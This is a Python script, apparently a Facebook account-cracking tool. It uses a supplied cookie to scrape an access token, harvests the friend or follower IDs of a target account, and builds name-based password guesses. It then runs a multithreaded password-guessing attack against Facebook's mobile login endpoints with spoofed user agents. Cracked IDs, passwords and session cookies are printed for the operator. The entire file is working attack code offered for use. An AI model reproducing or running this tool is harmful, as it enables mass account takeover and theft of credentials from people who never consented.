#---------------------
import requests,bs4,json,os,sys,random,datetime,time,re,urllib3,rich
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
from time import time as tiime
#---------------------


#---------------------
loop,ok,cp= 0,0,0
id,id2,uid,tokenn,pws,pws2,ugen,ugen2= [],[],[],[],[],[],[],[]
#---------------------


#---------------------
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
        prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
        open('.prox.txt','w').write(prox)
except Exception as e:
        print('[[\x1b[1;92mMALA\x1b[1;97m] [\x1b[1;96mAlvino_adijaya_xy')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
        a='Mozilla/5.0 (Symbian/3; Series60/'
        b=random.randrange(1, 9)
        c=random.randrange(1, 9)
        d='Nokia'
        e=random.randrange(100, 9999)
        f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'        
        g=random.randrange(1, 9)
        h=random.randrange(1, 4)
        i=random.randrange(1, 4)
        j=random.randrange(1, 4)
        k='Mobile Safari/535.1'
        uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
        ugen2.append(uaku)


        aa='Mozilla/5.0 (Linux; U; Android'
        b=random.choice(['6','7','8','9','10','11','12'])
        c=' en-us; GT-'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)
for x in range(10):
        a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
        b=random.randrange(100, 9999)
        c=random.randrange(100, 9999)
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        h=random.randrange(1, 9)
        i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
        j=random.randrange(1, 9)
        k=random.randrange(1, 9)
        l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
        uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'

def uaku():
        try:
                ua=open('bbnew.txt','r').read().splitlines()                
                for ub in ua:
                        ugen.append(ub)
        except:
                a=requests.get('https://github.com/Luffyomala/pahq.txt/blob/main/Kaml.txt').text
                ua=open('.bbnew.txt','w')
                aa=re.findall('line">(.*?)<',str(a))
                for un in aa:
                        ua.write(un+'\n')
                ua=open('.bbnew.txt','r').read().splitlines()
#---------------------







#---------------------
logo = """
\033[34;1m
\033[36;1m
\033[34;1m
\033[36;1m
\033[34;1m
\033[36;1m
\033[34;1m
\033[36;1m
\033[34;1m
\033[36;1m ----------------------------------------------------
 \033[36;1m----------------------------------------------------
\033[32;1mCREATOR : \033[0;1m free
\033[32;1mTELEGRAM : \033[0;1m https://t.me/KURDSTAN_99
\033[32;1mVERSION : \033[0;1m OWNER TOOL "' @s9_gs : @s9_gs\033[36;1m----------------------------------------------------
"""
#---------------------


#---------------------
def login():
        try:
                token = open('token.txt','r').read()
                cok = open('cookies.txt','r').read()
                tokenn.append(token)
        except KeyError:
                login2()
        except IOError:
                login2()
        try:
                loginn = requests.get('https://graph.facebook.com/me?access_token='+tokenn[0], cookies = {"cookie":cok})                
                idd = json.loads(loginn.text)['id']
                menu()
        except KeyError:
                login2()
        except IOError:
                login2()
#---------------------

#---------------------
def login2():
        os.system('clear')
        print(logo)
        try:
                cookie=input("\033[0;1m[ + ] \033[32;1mCOOKIES\033[0;1m: ")
                data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie})
                find_token = re.search("(EAAG\w+)", data.text)
                ken=open("token.txt", "w").write(find_token.group(1))
                cok=open("cookies.txt", "w").write(cookie)
                print('\033[36;1m----------------------------------------------------')
                os.system('python main_python_150_vip.py')
        except Exception as e:
                os.system("rm -rf cookies.txt && rm -rf token.txt")
                exit()
#---------------------


#---------------------
def menu():
        os.system('clear')
        print(logo)
        print('\033[0;1m[ \033[31;1m1 \033[0;1m] \033[32;1mPUBLIC ID \033[0;1mCLONE ')
        print('\033[0;1m[ \033[31;1m2 \033[0;1m] \033[32;1mFOLLOWERS ID \033[0;1mCLONE ')
        print('\033[0;1m[ \033[31;1m0 \033[0;1m] \033[1;91mLOGOUT ')
        print('\033[36;1m----------------------------------------------------')
        xoshnaw = input('\n\033[0;1m[ \033[31;1m+ \033[0;1m] CHOICE: ')
        if xoshnaw in ['1','01']:
                public()
        elif xoshnaw in ['2','02']:
                followers()
        elif xoshnaw in ['0','00']:
                os.system("rm -rf cookies.txt && rm -rf token.txt")
                exit()
        else:
                exit()
#---------------------


#---------------------
def public():
        try:
                cok= open('cookies.txt','r').read()
                token = open('token.txt','r').read()
                tokenn.append(token)
        except IOError:
                exit()
        os.system('clear')
        print(logo)
        target = input('\n\033[0;1m[ \033[31;1m+ \033[0;1m] ID: ')
        try:
                log = requests.get('https://graph.facebook.com/v2.0/'+target+'?fields=friends.limit(5000)&access_token='+tokenn[0], cookies = {"cookie":cok}).json()
                for i in log['friends']['data']:
                        try:id.append(i['id']+'|'+i['name'])                        
                        except:continue
                run()
        except requests.exceptions.ConnectionError:
                print('Error')
                login()
        except (KeyError,IOError):
                print('Error')
                login()
#---------------------


#---------------------
def followers():
        try:
                cok= open('cookies.txt','r').read()
                token = open('token.txt','r').read()
                tokenn.append(token)
        except IOError:
                exit()
        os.system('clear')
        print(logo)
        target = input('\n\033[0;1m[ \033[31;1m+ \033[0;1m] ID: ')
        try:
                log = requests.get('https://graph.facebook.com/'+target+'?fields=subscribers.limit(99999)&access_token='+tokenn[0],cookies={'cookie': cok}).json()
                for i in log['subscribers']['data']:
                        try:id.append(i['id']+'|'+i['name'])                        
                        except:continue
                run()
        except requests.exceptions.ConnectionError:
                exit();login()
        except (KeyError,IOError):
                exit();login()
#---------------------


def run():
        os.system('clear')
        print(logo)
        print('\033[0;1m[ \033[31;1m1 \033[0;1m] CRACK \033[32;1mOLD FB\n\033[0;1m[ \033[31;1m2 \033[0;1m] CRACK \033[32;1mNEW FB\n\033[0;1m[ \033[31;1m3 \033[0;1m] CRACK \033[32;1mRANDOM FB')
        print('\033[36;1m----------------------------------------------------')
        hu = input('\n\033[0;1m[ \033[31;1m+ \033[0;1m] CHOOSE: ')
        if hu in ['1','01']:
                for tua in sorted(id):
                        id2.append(tua)
        elif hu in ['2','02']:
                muda=[]
                for bacot in sorted(id):
                        muda.append(bacot)
                bcm=len(muda)
                bcmi=(bcm-1)
                for xmud in range(bcm):
                        id2.append(muda[bcmi])
                        bcmi -=1
        elif hu in ['3','03']:
                for bacot in id:
                        xx = random.randint(0,len(id2))
                        id2.insert(xx,bacot)
        else:
                exit()
#-------------------------------------------
        os.system('clear')
        print(logo)
        print('\033[0;1m[ \033[31;1mY \033[0;1m] \033[32;1mCHOOSE \033[0;1mPASSWORD\n\033[0;1m[ \033[31;1mT \033[0;1m] \033[32;1mTOOL \033[0;1mPASSWORD')
        print('\033[36;1m----------------------------------------------------')
        pwss=input('\n\033[0;1m[ \033[31;1m+ \033[0;1m] CHOOSE: ')
        if pwss in ['y','Y']:
                pws.append('ya')
                pwsss=input('\033[0;1m( \033[31;1m+ \033[0;1m) PASSWORD BNUSA: ')
                pwkuh=pwsss.split(',')
                for xpw in pwkuh:
                        pws2.append(xpw)
        else:
                pws.append('no')
        passs()
#---------------------

#---------------------
def passs():
        os.system('clear')
        print(logo)
        print('\033[0;1m[ \033[31;1m+ \033[0;1m] TOTAL ID: \033[32m'+str(len(id)))
        print('\033[0;1m[ \033[31;1m+ \033[0;1m] THE CLONE HAS BEEN \033[32mSTARTED')
        print('\033[0;1m[ \033[31;1m+ \033[0;1m] TO STOP THE TOOL \033[32mCTRL+Z')
        print('\033[36;1m----------------------------------------------------')
        with ThreadPoolExecutor(max_workers=30) as xoshnaw:
                for yuzong in id2:
                        idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
                        frs = nmf.split(' ')[0]
                        pwv = []
                        if len(nmf)<6:
                                if len(frs)<3:
                                        pass
                                else:
                                        pwv.append(nmf)
                                        pwv.append(frs+'123')
                                        pwv.append(frs+'111222')
                                        pwv.append(frs+'123123')
                                        pwv.append(frs+'100200')
                                        pwv.append(frs+'1000')
                                        pwv.append(frs+'112233')
                                        pwv.append(frs+'22334455')
                                        pwv.append(frs+'223344')
                                        pwv.append(frs+'1234')
                                        pwv.append(frs+'12345')
                                        pwv.append(frs+'123456789')
                                        pwv.append(frs+'112233')
                                        pwv.append(frs+'1999')
                                        pwv.append(frs+'2000')
                                        pwv.append(frs+'123123')
                                        pwv.append(frs+'123321')
                                        pwv.append(frs+'12341234')
                                        pwv.append(frs+'123456')
                                        pwv.append(frs+'12345678')
                                        pwv.append(frs+'1234567')
                                        pwv.append(frs+'123456789')
                                        pwv.append(frs+'1122')
                                        pwv.append(frs+'11')                                        
                                        pwv.append(frs+'1212')
                                        pwv.append(frs+'1313')
                                        pwv.append(frs+'1345')
                                        pwv.append(frs+'112')
                                        pwv.append(frs+'12')                                        
                                        pwv.append(frs+'10')                                        
                                        pwv.append(frs+'11223344')
                                        pwv.append(frs+'1122334455')
                                        pwv.append(frs+'112233445566')
                                        pwv.append(frs+'1990')
                                        pwv.append(frs+'1991')
                                        pwv.append(frs+'1992')
                                        pwv.append(frs+'1993')
                                        pwv.append(frs+'1994')
                                        pwv.append(frs+'1995')
                                        pwv.append(frs+'1996')
                                        pwv.append(frs+'1997')
                                        pwv.append(frs+'1998')
                                        pwv.append(frs+'1999')
                                        pwv.append(frs+'2000')
                                        pwv.append(frs+'2001')
                                        pwv.append(frs+'2002')
                                        pwv.append(frs+'2003')
                                        pwv.append(frs+'2004')
                                        pwv.append(frs+'2005')
                                        pwv.append(frs+'2006')
                                        pwv.append(frs+'2007')
                                        pwv.append(frs+'2008')
                                        pwv.append(frs+'2009')
                                        pwv.append(frs+'2010')
                        else:
                                if len(frs)<3:
                                        pwv.append(nmf)
                                else:
                                        pwv.append(nmf)
                                        pwv.append(frs+'123')
                                        pwv.append(frs+'111222')
                                        pwv.append(frs+'123123')
                                        pwv.append(frs+'100200')
                                        pwv.append(frs+'1000')
                                        pwv.append(frs+'112233')
                                        pwv.append(frs+'22334455')
                                        pwv.append(frs+'223344')
                                        pwv.append(frs+'1234')
                                        pwv.append(frs+'12345')
                                        pwv.append(frs+'123456789')
                                        pwv.append(frs+'112233')
                                        pwv.append(frs+'1999')
                                        pwv.append(frs+'2000')
                                        pwv.append(frs+'123123')
                                        pwv.append(frs+'123321')
                                        pwv.append(frs+'12341234')
                                        pwv.append(frs+'123456')
                                        pwv.append(frs+'12345678')
                                        pwv.append(frs+'1234567')
                                        pwv.append(frs+'123456789')
                                        pwv.append(frs+'1122')
                                        pwv.append(frs+'11')                                       
                                        pwv.append(frs+'1212')
                                        pwv.append(frs+'1313')
                                        pwv.append(frs+'1345')
                                        pwv.append(frs+'112')
                                        pwv.append(frs+'12')                                        
                                        pwv.append(frs+'10')
                                        pwv.append(frs+'11223344')
                                        pwv.append(frs+'1122334455')
                                        pwv.append(frs+'112233445566')
                                        pwv.append(frs+'1990')
                                        pwv.append(frs+'1991')
                                        pwv.append(frs+'1992')
                                        pwv.append(frs+'1993')
                                        pwv.append(frs+'1994')
                                        pwv.append(frs+'1995')
                                        pwv.append(frs+'1996')
                                        pwv.append(frs+'1997')
                                        pwv.append(frs+'1998')
                                        pwv.append(frs+'1999')
                                        pwv.append(frs+'2000')
                                        pwv.append(frs+'2001')
                                        pwv.append(frs+'2002')
                                        pwv.append(frs+'2003')
                                        pwv.append(frs+'2004')
                                        pwv.append(frs+'2005')
                                        pwv.append(frs+'2006')
                                        pwv.append(frs+'2007')
                                        pwv.append(frs+'2008')
                                        pwv.append(frs+'2009')
                                        pwv.append(frs+'2010')
                                        pwv.append(frs+'2011')
                                        pwv.append(frs+'2012')
                        if 'ya' in pws:
                                for xpwd in pws2:
                                        pwv.append(xpwd)
                        else:pass
                        xoshnaw.submit(mfb,idf,pwv)
        print('\n')
        meno = input('\033[0;1m[ \033[31;1m+ \033[0;1m] ENTER TO MENU ');menu()


def mfb(idf,pwv):
        global loop,ok,cp
        sys.stdout.write(f"\r\033[0;1m[ \033[0;1m{loop} \033[0;1m• \033[1;91m{len(id)} \033[0;1m]  \033[0;1m[ \033[32;1m{ok} \033[0;1m]  \033[0;1m[ \033[33;1m{cp} \033[0;1m]"),
        sys.stdout.flush()
        ua = random.choice(ugen)
        ua2 = random.choice(ugen2)
        ses = requests.Session()
        for pw in pwv:
                try:
                        ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,id;q=0.6,bs;q=0.5"})
                        p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr').text
                        dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://m.facebook.com/login/save-device/'"}
                        ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https:/m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,id;q=0.6,bs;q=0.5"})
                        po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
                        if "checkpoint" in po.cookies.get_dict().keys():
                                print('\n')
                                print(f'\033[33;1m[ + ] CHECKPOINT:\n')
                                print(f'\033[33;1m[ + ] ID: {idf}\n[ + ] PASSWORD: {pw}')
                                cp+=1
                                break
                        elif "c_user" in ses.cookies.get_dict().keys():
                                coki = po.cookies.get_dict()                                
                                kuki = (";").join(["%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
                                print('\n')
                                print(f'\033[32;1m[ + ] SUCCESSFULL:\n')
                                print(f'\033[32;1m[ + ] ID: {idf}\n[ + ] PASSWORD: {pw}\n[ + ] COOKIE: {kuki}')
                                ok+= 1
                                break


                        else:
                                continue
                except requests.exceptions.ConnectionError:
                        time.sleep(1001)
        loop+=1


if __name__=='__main__':
        login()


